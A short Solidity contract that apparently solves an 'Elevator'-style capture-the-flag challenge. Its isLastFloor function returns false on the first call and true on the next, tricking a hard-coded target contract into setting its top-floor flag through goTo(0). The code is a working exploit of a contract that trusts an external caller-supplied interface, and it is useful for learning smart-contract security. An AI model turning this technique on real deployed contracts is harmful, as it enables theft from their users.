// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Elevator {

    address target = 0xFaf4454EA9CE248499803dc8bD48D594FeD767F0;
    bool first_entry = true;
    event TestBool(bool);

    function isLastFloor(uint) external returns (bool) {

        if(first_entry) {
            first_entry = false;
            return false;

        } else {
            first_entry = true;
            return true;
        }
        
    }

    function attack() public {

        bytes memory payload = abi.encodeWithSignature("goTo(uint256)", 0);
        (bool success, ) = target.call(payload);
        emit TestBool(success);
    }
}